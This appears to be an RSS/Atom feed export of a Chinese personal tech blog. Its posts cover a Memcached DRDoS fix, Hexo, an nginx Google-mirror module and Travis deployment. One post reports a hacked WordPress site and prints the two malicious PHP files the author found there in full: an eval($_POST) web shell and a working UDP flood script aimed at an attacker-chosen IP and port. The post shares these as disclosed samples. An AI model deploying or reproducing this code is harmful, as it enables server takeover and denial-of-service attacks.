id="关于反射式DRDoS原理"><a href="#关于反射式DRDoS原理" class="headerlink" title="关于反射式DRDoS原理"></a>关于反射式DRDoS原理</h2><p>DRDoS是英文“Distributed Reflection Denial of Service ”的缩写，中文意思是“分布式反射拒绝服务”。与DoS、DDoS不同，该方式靠的是发送大量带有被害者IP地址的数据包给攻击主机，然后攻击主机对IP地址源做出大量回应，形成拒绝服务攻击。</p><h2 id="LNMP修复办法"><a href="#LNMP修复办法" class="headerlink" title="LNMP修复办法"></a>LNMP修复办法</h2><p>以下是lnmp一键安装脚本的修复方法</p><p>根据阿里的建议：</p><blockquote><p>如果您的Memcached版本低于1.5.6，且不需要监听UDP。您可以重新启动Memcached 加入 <code>-U 0</code>启动参数，例如：<code>Memcached -U 0</code>，禁止监听在udp协议上</p></blockquote><p><code>vi /etc/init.d/memcached</code></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">start () &#123;</span><br><span class="line">    echo -n <span class="symbol">$</span><span class="string">"Starting $prog: "</span></span><br><span class="line">    memcached -d -p <span class="symbol">$</span>PORT -u <span class="symbol">$</span>USER -m <span class="symbol">$</span>CACHESIZE -c <span class="symbol">$</span>MAXCONN -P /var/run/memcached.pid <span class="symbol">$</span><span class="keyword">OPTIONS</span></span><br><span class="line">    RETVAL=<span class="symbol">$</span>?</span><br><span class="line">    echo</span><br><span class="line">    [ <span class="symbol">$</span>RETVAL -<span class="keyword">eq</span> <span class="number">0</span> ] &amp;&amp; touch /var/lock/subsys/memcached</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>改为(启动项添加 <code>-U 0</code>)</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">start () &#123;</span><br><span class="line">    echo -n <span class="symbol">$</span><span class="string">"Starting $prog: "</span></span><br><span class="line">    memcached -d -p <span class="symbol">$</span>PORT -u <span class="symbol">$</span>USER -m <span class="symbol">$</span>CACHESIZE -c <span class="symbol">$</span>MAXCONN -U <span class="number">0</span> -P /var/run/memcached.pid <span class="symbol">$</span><span class="keyword">OPTIONS</span></span><br><span class="line">    RETVAL=<span class="symbol">$</span>?</span><br><span class="line">    echo</span><br><span class="line">    [ <span class="symbol">$</span>RETVAL -<span class="keyword">eq</span> <span class="number">0</span> ] &amp;&amp; touch /var/lock/subsys/memcached</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://blog.csdn.net/microzone/article/details/79262549" target="_blank" rel="noopener">基于Memcached分布式系统DRDoS拒绝服务攻击技术研究</a><br><a href="https://paper.seebug.org/535/" target="_blank" rel="noopener">https://paper.seebug.org/535/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;关于Memcached系统&quot;&gt;&lt;a href=&quot;#关于Memcached系统&quot; class=&quot;headerlink&quot; title=&quot;关于Memcached系统&quot;&gt;&lt;/a&gt;关于Memcached系统&lt;/h2&gt;&lt;p&gt;Memcached是一个自由开源的，高性能，分布式内
      
    
    </summary>
    
      <category term="技术" scheme="https://www.love4026.org/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="lnmp" scheme="https://www.love4026.org/tags/lnmp/"/>
    
      <category term="memcache" scheme="https://www.love4026.org/tags/memcache/"/>
    
  </entry>
  
  <entry>
    <title>wordpress被注入的PHP恶意脚本</title>
    <link href="https://www.love4026.org/316012/wordpress-hacked-by-php-script/"/>
    <id>https://www.love4026.org/316012/wordpress-hacked-by-php-script/</id>
    <published>2018-03-05T02:10:37.000Z</published>
    <updated>2019-02-07T14:01:38.535Z</updated>
    
    <content type="html"><![CDATA[<p>今天整理博客的图片资源，发现之前的Wordpress被人hacked。wp-content/ 图片文件夹下有两个php文件，应该是之前通过timthumb脚本漏洞注入的，一直没有发现。</p><p><code>1jh.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>Pacifism.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">999999</span>);</span><br><span class="line">$host = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">$port = $_GET[<span class="string">'port'</span>];</span><br><span class="line">$exec_time = $_GET[<span class="string">'time'</span>];</span><br><span class="line">$Sendlen = <span class="number">65535</span>;</span><br><span class="line">$packets = <span class="number">0</span>;</span><br><span class="line">ignore_user_abort(<span class="keyword">True</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (StrLen($host)==<span class="number">0</span> <span class="keyword">or</span> StrLen($port)==<span class="number">0</span> <span class="keyword">or</span> StrLen($exec_time)==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (StrLen($_GET[<span class="string">'rat'</span>])&lt;&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $_GET[<span class="string">'rat'</span>].$_SERVER[<span class="string">"HTTP_HOST"</span>].<span class="string">"|"</span>.GetHostByName($_SERVER[<span class="string">'SERVER_NAME'</span>]).<span class="string">"|"</span>.php_uname().<span class="string">"|"</span>.$_SERVER[<span class="string">'SERVER_SOFTWARE'</span>].$_GET[<span class="string">'rat'</span>];</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Warning to: opening"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;$Sendlen;$i++)&#123;</span><br><span class="line">        $out .= <span class="string">"A"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$max_time = time()+$exec_time;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    $packets++;</span><br><span class="line">    <span class="keyword">if</span>(time() &gt; $max_time)&#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $fp = fsockopen(<span class="string">"udp://$host"</span>, $port, $errno, $errstr, <span class="number">5</span>);</span><br><span class="line">        <span class="keyword">if</span>($fp)&#123;</span><br><span class="line">            fwrite($fp, $out);</span><br><span class="line">            fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Send Host：$host:$port&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Send Flow：$packets * ($Sendlen/1024="</span> . round($Sendlen/<span class="number">1024</span>, <span class="number">2</span>) . <span class="string">")kb / 1024 = "</span> . round($packets*$Sendlen/<span class="number">1024</span>/<span class="number">1024</span>, <span class="number">2</span>) . <span class="string">" mb&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Send Rate："</span> . round($packets/$exec_time, <span class="number">2</span>) . <span class="string">" packs/s；"</span> . round($packets/$exec_time*$Sendlen/<span class="number">1024</span>/<span class="number">1024</span>, <span class="number">2</span>) . <span class="string">" mb/s"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天整理博客的图片资源，发现之前的Wordpress被人hacked。wp-content/ 图片文件夹下有两个php文件，应该是之前通过timthumb脚本漏洞注入的，一直没有发现。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1jh.php&lt;/code&gt;&lt;/p&gt;
&lt;figure clas
      
    
    </summary>
    
    
      <category term="wordpress" scheme="https://www.love4026.org/tags/wordpress/"/>
    
      <category term="php" scheme="https://www.love4026.org/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>如何在hexo博客文章中插入图片</title>
    <link href="https://www.love4026.org/316010/how-to-insert-image-in-hexo-blog-post/"/>
    <id>https://www.love4026.org/316010/how-to-insert-image-in-hexo-blog-post/</id>
    <published>2018-03-01T02:55:26.000Z</published>
    <updated>2019-02-07T14:01:38.531Z</updated>
    
    <content type="html"><![CDATA[<h2 id="绝对路径"><a href="#绝对路径" class="headerlink" title="绝对路径"></a>绝对路径</h2><p>当Hexo项目中只用到少量图片时，可以将图片统一放在<code>source/images</code>文件夹中，通过markdown语法访问它们。</p><p><code>source/images/image.jpg</code></p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="selector-attr">[]</span>(/images/image.jpg)</span><br></pre></td></tr></table></figure><p>图片既可以在首页内容中访问到，也可以在文章正文中访问到。</p><h2 id="相对路径"><a href="#相对路径" class="headerlink" title="相对路径"></a>相对路径</h2><p>图片除了可以放在统一的images文件夹中，还可以放在文章自己的目录中。文章的目录可以通过配置_config.yml来生成。</p><p><code>_config.yml</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>将<code>_config.yml</code>文件中的配置项post_asset_folder设为true后，执行命令<code>$ hexo new post_name</code>，在<code>source/_posts</code>中会生成文章post_name.md和同名文件夹post_name。将图片资源放在post_name中，文章就可以使用相对路径引用图片资源了。</p><p><code>_posts/post_name/image.jpg</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="selector-attr">[]</span>(<span class="selector-tag">image</span><span class="selector-class">.jpg</span>)</span><br></pre></td></tr></table></figure><p>上述是markdown的引用方式，图片只能在文章中显示，但无法在首页中正常显示。</p><p>如果希望图片在文章和首页中同时显示，可以使用标签插件语法。</p><p><code>_posts/post_name/image.jpg</code></p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="symbol">%</span> asset_img <span class="built_in">image</span>.jpg This <span class="built_in">is</span> an <span class="built_in">image</span> <span class="symbol">%</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;绝对路径&quot;&gt;&lt;a href=&quot;#绝对路径&quot; class=&quot;headerlink&quot; title=&quot;绝对路径&quot;&gt;&lt;/a&gt;绝对路径&lt;/h2&gt;&lt;p&gt;当Hexo项目中只用到少量图片时，可以将图片统一放在&lt;code&gt;source/images&lt;/code&gt;文件夹中，通过mar
      
    
    </summary>
    
      <category term="技术" scheme="https://www.love4026.org/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="hexo" scheme="https://www.love4026.org/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>nginx 反向代理Google扩展 ngx_http_google_filter_module</title>
    <link href="https://www.love4026.org/316008/nginx-proxy-module-ngx-http-google-filter-module/"/>
    <id>https://www.love4026.org/316008/nginx-proxy-module-ngx-http-google-filter-module/</id>
    <published>2018-03-01T02:29:20.000Z</published>
    <updated>2019-02-07T14:01:38.531Z</updated>
    
    <content type="html"><![CDATA[<p>Github上面的一个项目 <a href="https://github.com/cuber/ngx_http_google_filter_module" target="_blank" rel="noopener">Nginx Module for Google</a> ，可以实现快捷部署Google镜像。</p><h2 id="重新编绎Nginx"><a href="#重新编绎Nginx" class="headerlink" title="重新编绎Nginx"></a>重新编绎Nginx</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@AY1407181147267575e9Z ~]<span class="comment"># nginx -V</span></span><br><span class="line">nginx <span class="keyword">version</span>: nginx/1.6.0</span><br><span class="line">built by gcc 4.4.7 20120313 <span class="params">(Red Hat 4.4.7-4)</span> <span class="params">(GCC)</span> </span><br><span class="line">TLS SNI support enabled</span><br><span class="line">configure arguments: <span class="params">--user=www</span> <span class="params">--group=www</span> <span class="params">--prefix=/usr/local/nginx</span> <span class="params">--with-http_stub_status_module</span> <span class="params">--with-http_ssl_module</span> <span class="params">--with-http_gzip_static_module</span> <span class="params">--with-ipv6</span></span><br></pre></td></tr></table></figure><p>我使用的是lnmp.org的一键安装包，其它情形查看 <a href="https://github.com/cuber/ngx_http_google_filter_module" target="_blank" rel="noopener">https://github.com/cuber/ngx_http_google_filter_module</a> ,上面有详细的说明。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="string">//github.com/cuber/ngx_http_google_filter_module</span></span><br><span class="line">git clone https:<span class="string">//github.com/yaoweibin/ngx_http_substitutions_filter_module</span></span><br><span class="line"><span class="keyword">cd</span> nginx-1.6.0/</span><br><span class="line"><span class="string">./configure</span> <span class="params">--user=www</span> <span class="params">--group=www</span> <span class="params">--prefix=/usr/local/nginx</span> <span class="params">--with-http_stub_status_module</span>  \</span><br><span class="line"><span class="params">--with-http_ssl_module</span> <span class="params">--with-http_gzip_static_module</span> <span class="params">--with-ipv6</span> \</span><br><span class="line"><span class="params">--add-module=</span><span class="string">../ngx_http_google_filter_module</span> \</span><br><span class="line"><span class="params">--add-module=</span><span class="string">../ngx_http_substitutions_filter_module</span></span><br><span class="line"></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">ln -s <span class="string">/usr/local/nginx/sbin/nginx</span> <span class="string">/usr/bin/nginx</span></span><br><span class="line">nginx -t</span><br><span class="line">service nginx restart</span><br></pre></td></tr></table></figure><h2 id="虚拟主机配置"><a href="#虚拟主机配置" class="headerlink" title="虚拟主机配置"></a>虚拟主机配置</h2><p><code>vi /usr/local/nginx/conf/vhost/demo.website.com.conf</code>, 保持内容如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https的可以使用lnmp的脚本配置，在添加虚拟主机的时候有提示是否使用ssl</span></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">443</span> ssl http2;</span><br><span class="line">    <span class="attribute">server_name</span> demo.website.com;</span><br><span class="line">    <span class="attribute">ssl_certificate</span> /usr/local/nginx/conf/ssl/demo.website.com.crt;</span><br><span class="line">    <span class="attribute">ssl_certificate_key</span> /usr/local/nginx/conf/ssl/demo.website.com.key;</span><br><span class="line">    <span class="attribute">ssl_session_timeout</span> <span class="number">10m</span>;</span><br><span class="line">    <span class="attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="number">1</span> TLSv1.<span class="number">2</span>;</span><br><span class="line">    <span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">ssl_ciphers</span> CHACHA20:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-RC4-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA:RC4-SHA:!aNULL:!eNULL:!EXPORT:!DES:!3DES:!MD5:!DSS:!PKS;</span><br><span class="line">    <span class="attribute">ssl_session_cache</span> builtin:<span class="number">1000</span> shared:SSL:<span class="number">10m</span>;</span><br><span class="line">    <span class="attribute">resolver</span> <span class="number">8.8.8.8</span> <span class="number">8.8.4.4</span> valid=<span class="number">300s</span>;</span><br><span class="line">    <span class="attribute">resolver_timeout</span> <span class="number">5s</span>;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">google</span> <span class="literal">on</span>;</span><br><span class="line">        <span class="attribute">google_scholar</span> <span class="literal">on</span>;  <span class="comment"># google_scholar 依赖于 google, 所以 google_scholar 无法独立使用。由于谷歌学术近日升级, 强制使用 https 协议, 并且 ncr 已经支持, 所以不再需要指定谷歌学术的 tld</span></span><br><span class="line">        <span class="attribute">google_language</span> en;  <span class="comment"># 语言偏好，默认使用 zh-CN (中文)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> demo.website.com;</span><br><span class="line">    <span class="attribute">rewrite</span><span class="regexp"> ^(.*)$</span> https://<span class="variable">$host</span><span class="variable">$1</span> <span class="literal">permanent</span>; <span class="comment"># 访问http跳转至https</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保存配置文件，重启nginx即可。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://github.com/cuber/ngx_http_google_filter_module" target="_blank" rel="noopener">Nginx Module for Google</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Github上面的一个项目 &lt;a href=&quot;https://github.com/cuber/ngx_http_google_filter_module&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Nginx Module for Google&lt;/a&gt;
      
    
    </summary>
    
      <category term="技术" scheme="https://www.love4026.org/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="nginx" scheme="https://www.love4026.org/tags/nginx/"/>
    
  </entry>
  
  <entry>
    <title>重新整理下我的个人博客</title>
    <link href="https://www.love4026.org/316002/my-new-blog-2018/"/>
    <id>https://www.love4026.org/316002/my-new-blog-2018/</id>
    <published>2018-02-28T08:22:13.000Z</published>
    <updated>2019-02-07T14:01:38.531Z</updated>
    
    <content type="html"><![CDATA[<p>昨天把个人博客迁移到github pages上面了，今天把博客主题重新整理了下。</p><p>这个博客从10年到今年，有8年时间了，最近一年因为域名过期，一直也没有整理它，今天把它弄好了，过几天再把之前的域名申请好，然后就可以上线了，未来准备换个域名，时间久了，人也变化很多，等这个域名的权重转移好之后，就可以更换了。</p><p>此博客重新上线，放到了github.com上面一份，VPS上面一份，使用了travis自动发布，由于国内域名需要备案，要在国内畅通打开还需要一段时间。</p><p>博客涉及到诸多技术问题，有想了解的，可以到<a href="https://github.com/sbmzhcn/sbmzhcn.github.io/tree/source" target="_blank" rel="noopener">我的github页面</a>去查看源码，不是特别难，但第一次部署比较麻烦。</p><h2 id="博客添加RSS功能"><a href="#博客添加RSS功能" class="headerlink" title="博客添加RSS功能"></a>博客添加RSS功能</h2><h3 id="安装RSS插件"><a href="#安装RSS插件" class="headerlink" title="安装RSS插件"></a>安装RSS插件</h3><p><code>npm install hexo-generator-feed --save</code></p><h3 id="开启网站-RSS-支持"><a href="#开启网站-RSS-支持" class="headerlink" title="开启网站 RSS 支持"></a>开启网站 RSS 支持</h3><p>编辑网站根目录下的 _config.yml，添加以下代码开启</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># RSS订阅支持</span></span><br><span class="line"><span class="symbol">plugin:</span></span><br><span class="line">- hexo-generator-feed</span><br><span class="line"></span><br><span class="line"><span class="meta"># Feed Atom</span></span><br><span class="line"><span class="symbol">feed:</span></span><br><span class="line"><span class="symbol">type:</span> atom</span><br><span class="line"><span class="symbol">path:</span> atom.xml</span><br><span class="line"><span class="symbol">limit:</span> <span class="number">20</span></span><br></pre></td></tr></table></figure><h3 id="主题开启-RSS-支持"><a href="#主题开启-RSS-支持" class="headerlink" title="主题开启 RSS 支持"></a>主题开启 RSS 支持</h3><p>主题不同开启方法不同，我的是 NexT 主题，默认就可以；其他主题请参考主题说明。</p><h3 id="生成-RSS"><a href="#生成-RSS" class="headerlink" title="生成 RSS"></a>生成 RSS</h3><p>执行 hexo clean &amp;&amp; hexo g重新生成博客文件完成部署即可。 转载请注明出处，本文采用 CC4.0 协议授权</p><h2 id="头像生成地址"><a href="#头像生成地址" class="headerlink" title="头像生成地址"></a>头像生成地址</h2><p><a href="https://faceyourmanga.com" target="_blank" rel="noopener">https://faceyourmanga.com</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://reuixiy.github.io/technology/computer/computer-aided-art/2017/06/09/hexo-next-optimization.html" target="_blank" rel="noopener">https://reuixiy.github.io/technology/computer/computer-aided-art/2017/06/09/hexo-next-optimization.html</a><br><a href="https://github.com/willin/hexo-wordcount" target="_blank" rel="noopener">https://github.com/willin/hexo-wordcount</a><br><a href="https://www.tiexo.cn/gitment/" target="_blank" rel="noopener">体验GitHub Issues的评论系统——Gitment</a><br><a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">https://github.com/iissnan/hexo-theme-next</a><br><a href="http://saili.science/2017/04/02/github-for-win/" target="_blank" rel="noopener">http://saili.science/2017/04/02/github-for-win/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;昨天把个人博客迁移到github pages上面了，今天把博客主题重新整理了下。&lt;/p&gt;
&lt;p&gt;这个博客从10年到今年，有8年时间了，最近一年因为域名过期，一直也没有整理它，今天把它弄好了，过几天再把之前的域名申请好，然后就可以上线了，未来准备换个域名，时间久了，人也变化很
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>使用 TRAVIS 自动部署 HEXO 到 GITHUB 与 自己的VPS服务器</title>
    <link href="https://www.love4026.org/316000/deploy-hexo-blog-to-git-and-vps-auto-with-travis/"/>
    <id>https://www.love4026.org/316000/deploy-hexo-blog-to-git-and-vps-auto-with-travis/</id>
    <published>2018-02-28T04:15:47.000Z</published>
    <updated>2019-02-07T14:01:38.527Z</updated>
    
    <content type="html"><![CDATA[<p>使用 TRAVIS 自动部署 HEXO 到 GITHUB 与 自己的服务器</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>请尽可能用比较新的 RubyGems 版本，建议 2.6.x 以上。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>gem update --system <span class="comment"># 这里请翻墙一下</span></span><br><span class="line"><span class="variable">$ </span>gem -v</span><br><span class="line"><span class="number">2.6</span>.<span class="number">3</span></span><br></pre></td></tr></table></figure><p>使用国内镜像</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ gem sources --<span class="built_in">add</span> http<span class="variable">s:</span>//gems.<span class="keyword">ruby</span>-china.org/ --<span class="built_in">remove</span> http<span class="variable">s:</span>//rubygems.org/</span><br><span class="line">$ gem sources -<span class="keyword">l</span></span><br><span class="line">http<span class="variable">s:</span>//gems.<span class="keyword">ruby</span>-china.org</span><br><span class="line"># 确保只有 gems.<span class="keyword">ruby</span>-china.org</span><br></pre></td></tr></table></figure><p>参考： <a href="https://gems.ruby-china.org/" target="_blank" rel="noopener">https://gems.ruby-china.org/</a></p><h2 id="安装travis"><a href="#安装travis" class="headerlink" title="安装travis"></a>安装travis</h2><p><code>sudo gem install travis</code></p><h2 id="配置github"><a href="#配置github" class="headerlink" title="配置github"></a>配置github</h2><p>我的github之前已经配置好GitHub Pages，现在需要变成下面这样，之前只有master一个分支。</p><ul><li>master 存放 Hexo 生成好的静态文件，所有 commit 信息格式均为 <code>Site updated: %Y-%m-%d %H:%M:%S</code>；</li><li>source 存放 scaffolds（脚手架）、source（文章 Markdown 源码）、_config.yml（Hexo 配置）等文件，并设置为 repo 的默认分支。</li></ul><h2 id="配置-Travis-CI"><a href="#配置-Travis-CI" class="headerlink" title="配置 Travis CI"></a>配置 Travis CI</h2><ul><li>使用github帐号登录Travis，右上方按钮点击同步项目，下方打开需要集成的项目，最后点击齿轮进入项目配置页面</li><li>打开Build only if .travis.yml is present</li></ul><p>参考这篇文章 <a href="https://segmentfault.com/a/1190000009054888" target="_blank" rel="noopener">https://segmentfault.com/a/1190000009054888</a></p><h2 id="通过命令行登录-Travis-并加密文件："><a href="#通过命令行登录-Travis-并加密文件：" class="headerlink" title="通过命令行登录 Travis 并加密文件："></a>通过命令行登录 Travis 并加密文件：</h2><p>在hexo blog项目根目录下创建一个文件 <code>.travis.yml</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd 博客根目录</span><br><span class="line">touch <span class="selector-class">.travis</span><span class="selector-class">.yml</span></span><br><span class="line"></span><br><span class="line">#创建一个文件夹.travis</span><br><span class="line">mkdir .travis</span><br></pre></td></tr></table></figure><p>生成一个 ssh 密钥对（不要嫌麻烦直接把你机器上的秘钥拿去用了，太危险）：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> 博客根目录</span><br><span class="line"><span class="keyword">cd</span> <span class="string">.travis/</span></span><br><span class="line"><span class="comment"># 会生成traivs.key 和travis.key.pub</span></span><br><span class="line">$ ssh-keygen -f travis.key</span><br></pre></td></tr></table></figure><p>然后把生成的公钥文件（e.g. travis.key.pub）分别添加到 GitHub Deploy Keys、VPS 上的 ~/.ssh/authorized_keys 中，这样 Travis CI 的机器就可以直接访问这些服务器了。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> 博客根目录</span><br><span class="line"><span class="keyword">cd</span> <span class="string">.travis/</span></span><br><span class="line"><span class="comment"># 交互式操作，使用 GitHub 账号密码登录</span></span><br><span class="line"><span class="comment"># 如果是私有项目要加个 --pro 参数</span></span><br><span class="line">$ travis login <span class="params">--auto</span></span><br><span class="line"><span class="comment"># 加密完成后会在当前目录下生成一个 travis.key.enc 文件</span></span><br><span class="line"><span class="comment"># 还会在你的 .travis.yml 文件里自动加上用于解密的 shell 语句</span></span><br><span class="line">$ travis encrypt-file travis.key -add</span><br></pre></td></tr></table></figure><p>以上步骤完成后你会得到一个 travis.key.enc</p><h2 id="编辑-travis-yml"><a href="#编辑-travis-yml" class="headerlink" title="编辑 .travis.yml"></a>编辑 .travis.yml</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd 博客根目录</span><br><span class="line">vi <span class="selector-class">.travis</span><span class="selector-class">.yml</span></span><br></pre></td></tr></table></figure><p>这是我的配置文件</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 